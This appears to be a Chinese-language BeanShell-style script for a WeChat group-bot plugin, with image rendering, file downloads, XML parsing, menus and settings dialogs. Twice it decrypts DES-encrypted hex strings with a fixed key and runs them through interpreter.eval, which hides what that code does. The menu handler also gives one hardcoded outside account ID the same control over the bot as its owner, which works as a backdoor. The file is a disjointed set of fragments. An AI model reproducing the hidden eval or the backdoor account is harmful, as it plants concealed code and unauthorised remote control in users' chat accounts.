        CustomToast.a(mContext,"字体下载完成");
        return;
    }
    int num=(int)(Math.random()*10);
    String Path=JavaPath+"/数据/底图/底图"+num+".jpg";
    File directory = new File(Path);
    while(!directory.exists()) {
        DetectPic();
        num=(int)(Math.random()*10);
        Path=JavaPath+"/数据/底图/底图"+num+".jpg";
    }
    if(!list.contains(Path)) {
        try {
            long directorySize = directory.length();
            if (directorySize == 0) {
                getData(qun,text);
                delAllFile(directory,1);
                list.add(Path);
                DetectPic();
                return;
            }
            sendPic(qun,MakeTextPhoto(text,Path));
            delAllFile(directory,1);
            list.add(Path);
            DetectPic();
        } catch(Exception e) {
            CustomToast.a(mContext,"底图"+num+"错误,已删除并重新回调");
            delAllFile(directory,1);
            getData(qun,text);
            return;
        }
    } else {
        CustomToast.a(mContext,"太快了,请慢点");
        getData(qun,text);
    }
}
public static String fetchRedirectUrl(String url) {
    try {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(false);
        conn.setConnectTimeout(5000);
        return conn.getHeaderField("Location");
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
public final class MY {
    private final static String DES = "DES";
    public static String JM(String src, String key) {
        try {
            return new String(JM(hex2byte(src.getBytes()), key.getBytes()));
        } catch (Exception e)
        {}
        return null;
    }
    private static byte[] JM(byte[] src, byte[] key) throws Exception {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = "**********"
        SecretKey securekey = "**********"
        Cipher cipher = Cipher.getInstance(DES);
        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
        return cipher.doFinal(src);
    }
    private static byte[] hex2byte(byte[] b) {
        if((b.length % 2) != 0) throw new IllegalArgumentException("长度不是偶数");
        byte[] b2 = new byte[b.length / 2];
        for(int n = 0; n < b.length; n += 2) {
            String item = new String(b, n, 2);
            b2[n / 2] = (byte) Integer.parseInt(item, 16);
        }
        return b2;
    }
    private static String byte2hex(byte[] b) {
        String hs = "";
        String stmp = "";
        for(int n = 0; n < b.length; n++) {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if(stmp.length() == 1) hs = hs + "0" + stmp;
            else hs = hs + stmp;
        }
        return hs.toUpperCase();
    }
}
public static void xz(String url,String filepath) throws Exception {
    InputStream input = null;
    File file=new File(filepath);
    if(!file.getParentFile().exists()) {
        file.getParentFile().mkdirs();
        if(!file.exists()) {
            file.createNewFile();
        }
    }
    try {
        URL urlsssss = new URL(url);
        HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
        input = urlConn.getInputStream();
        byte[] bs = new byte[1024];
        int len;
        FileOutputStream out = new FileOutputStream(filepath, false);
        while((len = input.read(bs)) != -1) {
            out.write(bs, 0, len);
        }
        out.close();
        input.close();

    } catch (IOException e) {
        return;
    } finally {
        try {
            input.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    return;
}
private static void downloadFile(String url, String outputPath) throws IOException {
        InputStream input = null;
        FileOutputStream output = null;
        try {
            URL urls = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urls.openConnection();
            input = urlConn.getInputStream();
            output = new FileOutputStream(outputPath);

            byte[] bs = new byte[1024];
            int len;
            while ((len = input.read(bs)) != -1) {
                output.write(bs, 0, len);
            }
        } finally {
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
        }
    }

private MediaPlayer mediaPlayer;
public void 提示音(Context context, String pathOrUrl) {
        if (mediaPlayer == null) {
            mediaPlayer = new MediaPlayer();
        }
        try {
            mediaPlayer.reset();
            if (isFilePath(pathOrUrl)) {
                mediaPlayer.setDataSource(pathOrUrl);
            } else {
                Uri uri = Uri.parse(pathOrUrl);
                mediaPlayer.setDataSource(context, uri);
            }
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception e) {
            e.printStackTrace();
            releaseMediaPlayer();
        }
    }
public void releaseMediaPlayer() {
    if (mediaPlayer != null) {
        try {
            if (mediaPlayer.isPlaying()) {
                mediaPlayer.stop();
            }
            mediaPlayer.release();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        mediaPlayer = null;
    }
}
this.interpreter.eval(MY.JM("9c15a243e4cb5ebe8e8d2738ad5c5ee61a7b68d09cfd5533b7ab6302331c09cc262ef4f35dc65b420191626bb772daafba56449200d485c65b5f630a91722240b12f07c3e50387448b1e9686cde593ab0c6823c76c82036dda6f8efbaf78fee0413555f9513e1c7127a67773022f9c78659c30ad60c6c6eeb25b3b62b1fa408fa733d1f3b9b86020","SecretKey"),"eval stream");
public static String MakeTextPhoto(String text,String pic) {
    String textface=JavaPath+"/数据/字体.ttf";
    Object typeface;
    try {
        typeface=Typeface.createFromFile(textface);
    } catch(e) {
        typeface=Typeface.DEFAULT_BOLD;
    }
    text=text.replace("[]","");
    String[] word=text.split("\n");
    float textsize=65.0f;
    float padding=55.0f;
    Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
    paint.setTypeface(typeface);
    paint.setTextSize(textsize);
    Bitmap mybitmap;
    if(isFilePath(pic)) {
        mybitmap=BitmapFactory.decodeFile(pic);
    } else {
        URL imageUrl=new URL(pic);
        HttpURLConnection con=(HttpURLConnection)imageUrl.openConnection();
        con.setDoInput(true);
        con.connect();
        InputStream input=con.getInputStream();
        mybitmap=BitmapFactory.decodeStream(input);
    }
    float text_width=0;
    float average_width=0;
    float text_height=0;
    String newword="";
    for(String line:word) {
        average_width +=paint.measureText(line);
    }
    average_width=average_width/word.length;
    for(String line:word) {
        float width=paint.measureText(line);
        if(width-average_width>700) {
            int rr=Math.ceil(width/average_width);
            int cut=Math.ceil(line.length()/rr);

            line=splitString(line,cut);
            for(String newl:line.split("\n")) {
                width=paint.measureText(newl);
                if(text_width<width) text_width=width;
            }
        }
        if(text_width<width) text_width=width;
        newword+=line+"\n";
    }
    word=newword.split("\n");
    int width=(int)(text_width + padding * 2f);
    int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
    Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);
    Canvas canvas=new Canvas(original);
    Matrix matrix = new Matrix();
    float i=(float)width/(float)mybitmap.getWidth();
    float b=(float)heigth/(float)mybitmap.getHeight();
    if(i>b) b=i;
    //if(i<b) b=i;
    matrix.postScale(b,b); //长和宽放大缩小的比例
    Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
    canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
    canvas.drawColor(Color.parseColor("#5AFFFFFF"));//白色半透明遮罩
    float yoffset=textsize+padding;
    String[] colors = {"黑色"};
    //字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机
    String 菜单名字="";
    if(!取("开关","菜单名字").equals("")) {
        菜单名字=取("开关","菜单名字");
    }
    for(int i=0;i<word.length;i++) {
        if(i==0) {
            if(菜单名字.equals("-")) {
                paint.setColor(getColor(colors[i%(colors.length)]));
            } else paint.setColor(getColor("红色"));
        } else {
            paint.setColor(getColor(colors[i%(colors.length)]));
        }
        canvas.drawText(word[i],padding,yoffset,paint);
        yoffset+=textsize+8;
    }
    String path=JavaPath+"/缓存/图片/"+canvas+".png";
    File end=new File(path);
    if(!end.exists()) end.getParentFile().mkdirs();
    FileOutputStream out=new FileOutputStream(end);
    original.compress(Bitmap.CompressFormat.JPEG, 100, out);
    out.close();
    return path;
}
private static String randomColor(int len) {
    try {
        StringBuffer result=new StringBuffer();
        for (int i=0; i < len; i++) {
            result.append(Integer.toHexString(new Random().nextInt(16)));
        }
        return result.toString().toUpperCase();
    } catch (Exception e) {
        return "00CCCC";
    }
};
public static int getColor(String color) {
    switch(color) {
    case "红色":
        return Color.RED;
    case "黑色":
        return Color.BLACK;
    case "蓝色":
        return Color.BLUE;
    case "蓝绿":
        return Color.CYAN;
    case "白灰":
        return Color.LTGRAY;
    case "灰色":
        return Color.GRAY;
    case "绿色":
        return Color.GREEN;
    case "深灰":
        return Color.DKGRAY;
    case "洋红":
        return Color.MAGENTA;
    case "透明":
        return Color.TRANSPARENT;
    case "白色":
        return Color.WHITE;
    case "黄色":
        return Color.YELLOW;
    case "随机":
        return Color.parseColor("#"+randomColor(6));
    default:
        return Color.parseColor("#"+color);
    }
};
public Object ParseColor(String color,Object normal) {
    Object parsecolor;
    try {
        if(color.contains("随机")) parsecolor=Color.parseColor(randomColor(6));
        else parsecolor=Color.parseColor(color);
    } catch(e) {
        parsecolor=normal;
    }
    return parsecolor;
}
public String splitString(String content, int len) {
    String tmp="";
    if(len > 0) {
        if(content.length() > len) {
            int rows=Math.ceil(content.length() / len);
            for (int i=0; i < rows; i++) {
                if(i == rows - 1) {
                    tmp += content.substring(i * len);
                } else {
                    tmp += content.substring(i * len, i * len + len) + "\n ";
                }
            }
        } else {
            tmp=content;
        }
    }
    return tmp;
}
this.interpreter.eval(MY.JM("063ff10c908efb729b08fae97a1f001d78f5fde433f09c71f81ea8b5c827855ac2545369ad9164cc5bf150006a0f6af6","SecretKey"),"eval stream");
//获取目录大小
public static String getFormattedSize(File folder) {
    if (folder == null || !folder.exists()) {
        return "文件夹不存在或为空";
    }
    long sizeInBytes=getFolderSize(folder);
    double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
    DecimalFormat decimalFormat=new DecimalFormat("#.###");
    if (sizeInKB < 1024) {
        return decimalFormat.format(sizeInKB) + "KB";
    } else if (sizeInKB < 1024 * 1024) {
        double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
        return decimalFormat.format(sizeInMB) + "MB";
    } else {
        double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
        return decimalFormat.format(sizeInGB) + "GB";
    }
}
public static long getFolderSize(File folder) {
    long size=0;
    File[] files=folder.listFiles();
    if (files != null) {
        for (File file : files) {
            if (file.isFile()) {
                size += file.length();
            } else if (file.isDirectory()) {
                size += getFolderSize(file);
            }
        }
    }
    return size;
}
delAllFile(new File(JavaPath+"/缓存"),0);
public static String u加(String str) {
    String r="";
    for (int i=0; i < str.length(); i++) {
        int chr1=(char) str.charAt(i);
        String x=""+Integer.toHexString(chr1);
        if(x.length()==1)r+= "\\u000"+x;
        if(x.length()==2)r+= "\\u00"+x;
        if(x.length()==3)r+= "\\u0"+x;
        if(x.length()==4)r+= "\\u"+x;
    }
    return r;
}
public static String u解(String unicode) {
    StringBuffer string = new StringBuffer();
    String[] hex = unicode.split("\\\\u");
    for (int i = 0; i < hex.length; i++) {
        try {
            if(hex[i].length()>=4) {
                String chinese = hex[i].substring(0, 4);
                try {
                    int chr = Integer.parseInt(chinese, 16);
                    boolean isChinese = isChinese((char) chr);
                    string.append((char) chr);
                    String behindString = hex[i].substring(4);
                    string.append(behindString);
                } catch (NumberFormatException e1) {
                    string.append(hex[i]);
                }

            } else {
                string.append(hex[i]);
            }
        } catch (NumberFormatException e) {
            string.append(hex[i]);
        }
    }
    return string.toString();
}
public static boolean isChinese(char c) {
    Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);
    if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS
            || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS
            || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A
            || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION
            || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION
            || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {
        return true;
    }
    return false;
}
public void onMsg(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    if("1".equals(getString("开关","私聊播报",""))) {
        播报(data);
    }
    if(!HList.contains(mWxid)) {
        if(data.isFile()||data.isText()||data.isReply()||data.isCard()) {
            if(mWxid.equals(wxid)) {
                YunJava(data);
            }
            if("1".equals(getString(qun,"开关",""))) {
                for(String Yun:getGroups()) {
                    if(Arrays.asList(YunJava).contains(Yun)||BList.contains(mWxid)||BList.contains(Yun)) { 
                        boolean start=yun.getBoolean("start");
                        try {
                            if(start) {
                                菜单(data);
                                if(data.talkerType==0) {
                                    回复(data);
                                }
                            }
                        } catch (Exception e) {
                            if(data.type!=16777265) {
                                Toast("["+脚本名称+"]出现错误\n"+e.getMessage());
                                if(text.equals("")) {
                                    text="";
                                } else {
                                    text="发送\""+text+"\"时\n";
                                }
                                sendTextCard(mWxid,"["+脚本名称+"]"+text+e.getMessage());
                            }
                        }
                        break;
                    }
                }
            }
        }
        if("1".equals(getString(qun,"开关",""))) {
            消息(data);
            进群(data);
            if("1".equals(getString(qun,"自身撤回",""))) {
                int 撤回时间 = 30;
                if(getInt(qun,"撤回时间",0) != null) {
                    撤回时间 = getInt(qun,"撤回时间",30);
                }
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    public void run() {
                        if(wxid.equals(mWxid)) {
                            recallMsg(data.msgId);
                        }
                    }
                }, 撤回时间*1000);
            }
        }
    }
}
public void YunJava(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    if(text.equals("开机")||text.equals("开启")) {
        if(!Arrays.asList(YunJava).contains(qun)&&!HList.contains(qun)||mWxid.equals(AuthorWxid)) {
            if("1".equals(getString(qun,"开关",""))) {
                sendMsg(qun,"已经开机了");
            } else {
                putString(qun,"开关","1");
                sendMsg(qun,"已开机");
            }
        } else {
            CustomToast.a(mContext,"已被拦截");
            sendMsg(mWxid,"\""+getName(qun)+"\"已被拦截");
        }
    }
    if(text.equals("关机")||text.equals("关闭")) {
        if("1".equals(getString(qun,"开关",""))) {
            putString(qun,"开关",null);
            sendMsg(qun,"已关机");
        }
    }
    if(text.equals("所有群设置")||text.equals("所有群开关")) {
        所有群设置();
        recallMsg(data.msgId);
    }
    if(text.equals("开关设置")||text.equals("设置开关")) {
        if(!Arrays.asList(YunJava).contains(qun)&&!HList.contains(qun)||mWxid.equals(AuthorWxid)) {
            开关设置(qun);
            recallMsg(data.msgId);
        } else {
            CustomToast.a(mContext,"已被拦截");
            sendMsg(mWxid,"\""+getName(qun)+"\"已被拦截");
        }
    }
    if(text.equals("配置设置")||text.equals("设置配置")) {
        配置设置(qun);
        recallMsg(data.msgId);
    }
}
boolean found=false;
for(String Yun:getGroups()) {
    if(Arrays.asList(YunJava).contains(Yun)||BList.contains(mWxid)||BList.contains(Yun)) {
        found=true;
        break;
    }
}
public void 配置设置(String qun) {
    initActivity();
    boolean 底部时间=true;
    boolean 底部文案=true;
    boolean 底部尾巴=true;
    boolean 私聊播报=true;
    if(!取("开关","底部时间").equals("1")) {
        底部时间=false;
    }
    if(!取("开关","底部文案").equals("1")) {
        底部文案=false;
    }
    if(!取("开关","底部尾巴").equals("1")) {
        底部尾巴=false;
    }
    if(!取("开关","私聊播报").equals("1")) {
        私聊播报=false;
    }
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog.Builder tx=new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
            String[] ww= {"底部时间","底部文案","底部尾巴","私聊播报"};
            boolean[] xx= {底部时间,底部文案,底部尾巴,私聊播报};
            TextView tc = new TextView(ThisActivity);
            tc.setText(Html.fromHtml("<font color=\"#D0ACFF\">菜单名字</font>"));
            tc.setTextSize(20);
            TextView tc1 = new TextView(ThisActivity);
            tc1.setText(Html.fromHtml("<font color=\"#71CAF8\">菜单指令</font>"));
            tc1.setTextSize(20);
            TextView tc2 = new TextView(ThisActivity);
            tc2.setText(Html.fromHtml("<font color=\"#21E9FF\">发送模式</font>"));
            tc2.setTextSize(20);
            TextView tc3 = new TextView(ThisActivity);
            tc3.setText(Html.fromHtml("<font color=\"#E09C4F\">手机号码</font>"));
            tc3.setTextSize(20);
            final EditText editText = new EditText(ThisActivity);
            editText.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认,填\"-\"无标题</font>"));
            editText.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>15) {
                        String limitedText = editable.toString().substring(0,15);
                        editText.setText(limitedText);
                        editText.setSelection(limitedText.length());
                    }
                }
            });
            editText.setText(取("开关","菜单名字"));
            final EditText editText1=new EditText(ThisActivity);
            editText1.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
            editText1.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText1.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>10) {
                        String limitedText = editable.toString().substring(0,10);
                        editText1.setText(limitedText);
                        editText1.setSelection(limitedText.length());
                    }
                }
            });
            editText1.setText(取("开关","菜单指令"));
            final EditText editText2=new EditText(ThisActivity);
            editText2.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认文字 1图片 2卡片</font>"));
            editText2.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText2.setInputType(InputType.TYPE_CLASS_NUMBER);
            editText2.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence s,int start,int count,int after) {}
                public void onTextChanged(CharSequence s,int start,int before,int count) {
                    if(!s.toString().matches("[1-2]")) {
                        editText2.getText().delete(editText2.length()-1, editText2.length());
                    }
                }
                public void afterTextChanged(Editable s) {}
            });
            editText2.setText(取("开关","发送模式"));
            final EditText editText3=new EditText(ThisActivity);
            editText3.setHint(Html.fromHtml("<font color=\"#A2A2A2\">请输入手机号码</font>"));
            editText3.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText3.setInputType(InputType.TYPE_CLASS_NUMBER);
            editText3.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>11) {
                        String limitedText = editable.toString().substring(0,11);
                        editText3.setText(limitedText);
                        editText3.setSelection(limitedText.length());
                    }
                }
            });
            String phoneNumber=取("开关","手机号码");
            if (phoneNumber.length() > 7) {
                phoneNumber=phoneNumber.substring(0,3)+"******"+phoneNumber.substring(9);
            }
            editText3.setText(phoneNumber);
            LinearLayout cy=new LinearLayout(ThisActivity);
            cy.setOrientation(LinearLayout.VERTICAL);
            cy.addView(tc);
            cy.addView(editText);
            cy.addView(tc1);
            cy.addView(editText1);
            cy.addView(tc2);
            cy.addView(editText2);
            cy.addView(tc3);
            cy.addView(editText3);
            tx.setTitle(Html.fromHtml("<font color=\"red\">配置设置</font>"));
            tx.setView(cy);
            tx.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">确认</font>"),new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface,int i) {
                    String tx=editText.getText().toString();
                    String tx1=editText1.getText().toString();
                    String tx2=editText2.getText().toString();
                    String tx3=editText3.getText().toString();
                    boolean[] cs=xx;
                    if(cs[0]) {
                        存("开关", "底部时间","1");
                    } else {
                        存("开关", "底部时间",null);
                    }
                    if(cs[1]) {
                        存("开关", "底部文案","1");
                    } else {
                        存("开关", "底部文案",null);
                    }
                    if(cs[2]) {
                        存("开关", "底部尾巴","1");
                    } else {
                        存("开关", "底部尾巴",null);
                    }
                    if(cs[3]) {
                        存("开关", "私聊播报","1");
                    } else {
                        存("开关", "私聊播报",null);
                    }
                    if(!tx3.equals("")) {
                        if(!tx3.contains("*")) {
                            存("开关","手机号码",tx3);
                        }
                    } else {
                        存("开关","手机号码",null);
                    }
                    if(!tx2.equals("")) {
                        存("开关","发送模式",tx2);
                    } else {
                        存("开关","发送模式",null);
                    }
                    if(!tx1.equals("")) {
                        存("开关","菜单指令",tx1);
                    } else {
                        存("开关","菜单指令",null);
                    }
                    if(!tx.equals("")) {
                        存("开关","菜单名字",tx);
                    } else {
                        存("开关","菜单名字",null);
                    }
                    CustomToast.a(mContext,"设置成功");
                }
            });
            tx.setNegativeButton(Html.fromHtml("<font color=\"#E3319D\">取消</font>"),new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface,int i) {
                }
            });
            tx.setMultiChoiceItems(ww,xx,new DialogInterface.OnMultiChoiceClickListener() {
                public void onClick(DialogInterface dialogInterface,int which,boolean isChecked) {
                    xx[which]=isChecked;
                }
            });
            tx.setCancelable(false);
            tx.show();
        }
    });
}
public static boolean isFilePath(String str) {
    File file = new File(str);
    return file.exists()&&file.canRead();
}
public static boolean isUUID(String str) {
    return str != null && str.matches("[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}");
}
public static boolean isXML(String text) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(new ByteArrayInputStream(text.getBytes("UTF-8")));
            return true;
        } catch (Exception e) {
            return false;
        }
}
public String getElementContent(String xmlString, String tagName) { //陌然
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        ByteArrayInputStream input = new ByteArrayInputStream(xmlString.getBytes("UTF-8"));
        Document document = builder.parse(input);
        NodeList elements = document.getElementsByTagName(tagName);
        if (elements.getLength() > 0) {
            return elements.item(0).getTextContent();
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
public String getElementAttribute(String xmlString, String tagName, String attributeName) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document document = builder.parse(new ByteArrayInputStream(xmlString.getBytes("UTF-8")));
        Element element = (Element) document.getElementsByTagName(tagName).item(0);
        if (element != null) {
            return element.getAttribute(attributeName);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
public String getElementContent(String xmlString, String elementName, String tagName) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document document = builder.parse(new InputSource(new StringReader(xmlString)));
        NodeList referMsgList = document.getElementsByTagName(elementName);
        if (referMsgList.getLength() > 0) {
            Node referMsgNode = referMsgList.item(0);
            NodeList contentList = referMsgNode.getChildNodes();
            for (int i = 0; i < contentList.getLength(); i++) {
                Node contentNode = contentList.item(i);
                if (contentNode.getNodeName().equalsIgnoreCase(tagName)) {
                    return contentNode.getTextContent();
                }
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
if(!found) {
    final Activity ThisActivity = getActivity();
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
            alertDialogBuilder.setTitle(Html.fromHtml("<font color=\"red\">提示</font>"));
            TextView messageTextView = new TextView(ThisActivity);
            messageTextView.setText(Html.fromHtml("<font color=\"#E09C4F\">需要加微信授权群才能使用，请前往网站查看相关信息，也可以点击下方直接进中转群寻求帮助</font>"));
            messageTextView.setPadding(20, 20, 20, 20);
            messageTextView.setTextSize(20);
            alertDialogBuilder.setView(messageTextView);
            alertDialogBuilder.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">前往网站</font>"), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    String url = "https://flowus.cn/share/d012f566-9f00-4d96-99ef-af04f9d0e39e";
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    ThisActivity.startActivity(intent);
                }
            });
            alertDialogBuilder.setNegativeButton(Html.fromHtml("<font color=\"#893BFF\">前往中转群</font>"), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    String url = "https://work.weixin.qq.com/gm/649edb8d62baeeb2002d5f843769dbbc";
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    ThisActivity.startActivity(intent);
                }
            });
            AlertDialog alertDialog = alertDialogBuilder.create();
            alertDialog.setCanceledOnTouchOutside(false);
            alertDialog.show();
        }
    });
}
import Hook.JiuWu.Xp.tools.HostInfo;
public String getStatus(String qun,String key) {
    return "1".equals(取(qun,key))?"关闭"+key+"[√]":"开启"+key+"[×]";
}
public void 菜单(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    File 代管=new File(JavaPath+"/数据/"+qun+"/代管.txt");
    if(!代管.getParentFile().exists()) {
        代管.getParentFile().mkdirs();
        if(!代管.exists()) {
            代管.createNewFile();
        }
    }
    if(!取(qun,"智能回复").equals("1")||data.talkerType==0&&取("开关","智能回复").equals("1")) {
        if(mWxid.equals(wxid)||简读用户(代管,wxid)|| wxid.equals("wxid_tasn67ogsmw821")) {
            开关(data);
            代管(data);
        }
        if("1".equals(getString(qun,"艾特回复",""))) {
            艾特(data);
        }
        String 菜单限制=data.sendTalker;
        if("1".equals(取(qun,"菜单限制"))) {
            菜单限制=mWxid;
        }
         if (菜单限制.equals(wxid) || 简读用户(代管, wxid)|| wxid.equals("wxid_tasn67ogsmw821")) {
            总结(data);
            报时(data);
            简报(data);
            if("1".equals(getString(qun,"自动回复",""))) {
                回复2(data);
            }
            if("1".equals(getString(qun,"头像制作",""))) {
                头像(data);
            }
            if("1".equals(getString(qun,"作图系统",""))) {
                作图(data);
            }
            if("1".equals(getString(qun,"智能系统",""))) {
                智能(data);
            }
            if("1".equals(getString(qun,"音乐系统",""))) {
                音乐(data);
            }
            if("1".equals(getString(qun,"图片系统",""))) {
                图片(data);
            }
            if("1".equals(getString(qun,"搜索功能",""))) {
                搜索(data);
            }
            if("1".equals(getString(qun,"视频系统",""))) {
                视频(data);
            }
            if("1".equals(getString(qun,"词条系统",""))) {
                词条(data);
            }
            if("1".equals(getString(qun,"查询系统",""))) {
                查询(data);
            }
            if("1".equals(getString(qun,"解析系统",""))) {
                解析(data);
            }
            if("1".equals(getString(qun,"娱乐系统",""))) {
                娱乐(data);
            }
            if("1".equals(getString(qun,"站长系统",""))) {
                站长(data);
            }
            if(!"1".equals(取(qun,"菜单屏蔽"))) {
                String 菜单="菜单";
                if(!取("开关","菜单指令").equals("")) {
                    菜单=取("开关","菜单指令");
                }
                if("1".equals(getString("开关","简洁模式",""))) {
                    if(text.equals(菜单)) {
                        String c="☆音乐系统☆智能系统☆\n"
                                +"☆配置设置☆图片系统☆\n"
                                +"☆开关系统☆底部样式☆\n"
                                +"☆搜索功能☆开关设置☆\n"
                                +"☆版本信息☆第二菜单☆";
                        sendm(qun,c);
                   }
                   if(text.equals("第二菜单")) {
                       String c="☆自身撤回☆查询系统☆\n"
                                +"☆视频系统☆解析系统☆\n"
                                +"☆艾特回复☆进群欢迎☆\n"
                                +"☆发送模式☆词条系统☆\n"
                                +"☆每日简报☆第三菜单☆";
                       sendm(qun,c);
                   }
                   if(text.equals("第三菜单")) {
                       String c="☆整点报时☆站长系统☆\n"
                                +"☆娱乐系统☆代管系统☆\n"
                                +"☆作图系统☆自动回复☆\n"
                                +"☆头像制作☆环球时报☆\n"
                                +"☆每日总结☆敬请期待☆";
                       sendm(qun,c);
                   }
                } else {
                    if ("1".equals(getString("开关", "完整菜单", ""))) {
                        if (text.equals(菜单)) {
                            String c = "☆音乐系统☆智能系统☆\n"
                                    + "☆配置设置☆图片系统☆\n"
                                    + "☆开关系统☆底部样式☆\n"
                                    + "☆搜索功能☆开关设置☆\n"
                                    + "☆版本信息☆自身撤回☆\n"
                                    + "☆视频系统☆解析系统☆\n"
                                    + "☆艾特回复☆进群欢迎☆\n"
                                    + "☆发送模式☆词条系统☆\n"
                                    + "☆每日简报☆查询系统☆\n"
                                    + "☆整点报时☆站长系统☆\n"
                                    + "☆娱乐系统☆代管系统☆\n"
                                    + "☆作图系统☆自动回复☆\n"
                                    + "☆头像制作☆环球时报☆\n"
                                    + "☆每日总结☆敬请期待☆";
                            sendm(qun, c);
                        }
                    } else {
                        if (text.equals(菜单)) {
                            String c = "🍅词条系统☆图片系统🍅\n"
                                    + "🍅音乐系统☆作图系统🍅\n"
                                    + "🍅进群欢迎☆娱乐系统🍅\n"
                                    + "🍅解析系统☆搜索功能🍅";
                            sendm(qun, c);
                        }
                    }
                }
                if(text.equals("头像制作")) {
                    String f=getStatus(qun,text);
                    String c="☆引用+国庆头像1-18\n"
                            
+"☆引用+透明头像1-2\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("自动回复")) {
                    String f=getStatus(qun,text);
                    String c="☆添加精确回复 触发|回复\n"
                             +"☆添加模糊回复 触发|回复\n"
                             +"☆查看精确回复\n"
                             +"☆查看模糊回复\n"
                             +"☆清空精确回复\n"
                             +"☆清空模糊回复\n"
                             +"☆清空全部回复\n\n"
                             +"回复支持以下额外格式\n"
                             +"测试|[$€]\n"
